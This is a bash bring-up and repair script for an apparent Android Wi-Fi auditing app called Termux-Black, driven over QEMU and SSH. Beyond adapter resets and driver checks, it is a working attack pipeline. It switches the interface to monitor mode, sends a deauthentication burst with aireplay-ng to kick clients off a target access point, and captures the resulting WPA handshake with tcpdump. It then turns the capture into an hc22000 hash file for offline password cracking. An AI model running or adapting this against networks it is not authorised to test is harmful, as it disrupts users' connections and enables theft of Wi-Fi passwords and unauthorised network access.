#!/bin/bash
# Termux-Black guest bring-up / repair.
#
# Run this INSIDE the QEMU guest (or over the app's SSH forward:
#   adb forward tcp:12222 tcp:2222 && ssh -p 12222 root@127.0.0.1 'bash -s' < scripts/guest-bringup.sh
# ). It is the dev + troubleshooting path: a shipped install needs none of it, because the app
# installs, launches and attaches by itself and the driver options are baked into the rootfs.
#
# What it does, in the only order that works:
#   1. reset the adapter's USB state (this is what restores the data-frame path)
#   2. verify the 88XXau module options that make data frames arrive at all
#   3. monitor mode, then the channel via iwconfig (nl80211 is ignored by this driver)
#   4. arm a capture and, optionally, deauth a target - then report frame classes and validate
#
# Usage:
#   guest-bringup.sh                 # reset + verify + monitor on CHANNEL (default 10), no capture
#   CAPTURE=1 SECS=120 guest-bringup.sh
#   CAPTURE=1 DEAUTH=1 AP=AA:BB:CC:DD:EE:FF guest-bringup.sh
set -u

CHANNEL="${CHANNEL:-10}"
IFACE="${IFACE:-wlan0}"
CAPTURE="${CAPTURE:-0}"
SECS="${SECS:-120}"
DEAUTH="${DEAUTH:-0}"
AP="${AP:-}"
OUT="${OUT:-/root/cap}"
MOD=88XXau

say() { echo "[bringup] $*"; }

# ---------------------------------------------------------------- 1. reset the adapter
reset_adapter() {
    local dev
    dev=$(for d in /sys/bus/usb/devices/*/; do
            v=$(cat "$d/idVendor" 2>/dev/null); p=$(cat "$d/idProduct" 2>/dev/null)
            [ "$v" = "0bda" ] && [ "$p" = "8812" ] && basename "$d"
          done | head -1)
    if [ -z "$dev" ]; then
        say "adapter not present in the guest - attach it first (VM up, then plug in / Attach)"
        return 1
    fi
    say "re-enumerating USB device $dev (restores the data-frame path)"
    ip link set "$IFACE" down 2>/dev/null
    echo "$dev" > /sys/bus/usb/drivers/usb/unbind 2>/dev/null
    sleep 3
    echo "$dev" > /sys/bus/usb/drivers/usb/bind 2>/dev/null
    sleep 6
    iw dev "$IFACE" info >/dev/null 2>&1 || { say "no $IFACE after re-enumeration"; return 1; }
    say "adapter back: $(cat /sys/class/net/$IFACE/address 2>/dev/null) driver=$(basename "$(readlink -f /sys/class/net/$IFACE/device/driver)" 2>/dev/null)"
}

# ------------------------------------------------- 2. module options (load-time settings)
check_params() {
    say "module options actually in effect:"
    for p in rtw_usb_rxagg_mode rtw_dynamic_agg_enable rtw_ips_mode rtw_lps_level rtw_country_code; do
        printf '  %-24s = %s\n' "$p" "$(cat /sys/module/$MOD/parameters/$p 2>/dev/null || echo MISSING)"
    done
    lsmod | grep -i "$MOD" >/dev/null || say "WARNING: $MOD not loaded"
    if lsmod | grep -qi '^8812au'; then
        say "WARNING: a second driver (8812au) is loaded too - blacklist it:"
        say "         echo 'blacklist 8812au' > /etc/modprobe.d/blacklist-8812au.conf"
    fi
}

# ------------------------------------------------------------------- 3. monitor + channel
set_monitor() {
    ip link set "$IFACE" down
    iw dev "$IFACE" set type monitor
    ip link set "$IFACE" up
    sleep 2
    iwconfig "$IFACE" channel "$CHANNEL"      # iwconfig, NOT `iw dev set channel`
    sleep 1
    say "interface: $(iw dev "$IFACE" info | grep -E 'type|channel' | tr '\n' ' ')"
}

# -------------------------------------------------------------- 4. optional live capture
run_capture() {
    rm -f "$OUT".pcap "$OUT".hc22000
    say "arming ${SECS}s capture on channel $CHANNEL (arm FIRST, then let the client reconnect)"
    timeout -k 5 "$SECS" tcpdump -i "$IFACE" -nn -e -c 200000 -w "$OUT".pcap 2>/dev/null &
    TCPDUMP_PID=$!
    sleep 5
    if [ "$DEAUTH" = "1" ] && [ -n "$AP" ]; then
        # Only useful against a non-PMF client; against WPA3/PMF it is ACKed then discarded.
        say "one short deauth burst to $AP (skip this on WPA3/PMF: let the client reconnect instead)"
        timeout 15 aireplay-ng -0 2 -a "$AP" "$IFACE" >/tmp/deauth.log 2>&1
    fi
    wait "$TCPDUMP_PID"
    pkill -x airodump-ng 2>/dev/null
    say "capture closed: $(stat -c%s "$OUT".pcap 2>/dev/null || echo 0) bytes"
    # Count with the labels tcpdump really prints - `Data` alone reports a false zero.
    say "data frames : $(tcpdump -r "$OUT".pcap -nn 2>/dev/null | grep -icE 'Data IV:|CF \+QoS|Data \(')"
    say "eapol frames: $(tcpdump -r "$OUT".pcap -nn 2>/dev/null | grep -ic eapol)"
    say "assoc frames: $(tcpdump -r "$OUT".pcap -nn 2>/dev/null | grep -ic assoc)"
    if command -v hcxpcapngtool >/dev/null 2>&1; then
        say "validating with hcxpcapngtool (M1..M4 + hash file):"
        hcxpcapngtool -o "$OUT".hc22000 "$OUT".pcap 2>&1 | grep -iE "EAPOL M[1-4] |EAPOL messages|no hashes" | sed 's/^/  /'
        [ -s "$OUT".hc22000 ] && say "hash written: $OUT.hc22000 ($(grep -c . "$OUT".hc22000) hash(es), type 01=PMKID 02=EAPOL)"
    fi
    say "NOTE: aircrack's '1 potential targets' / 'Please specify a dictionary' prove nothing."
}

reset_adapter || exit 1
check_params
set_monitor
[ "$CAPTURE" = "1" ] && run_capture
say "ready: $IFACE in monitor mode on channel $CHANNEL"
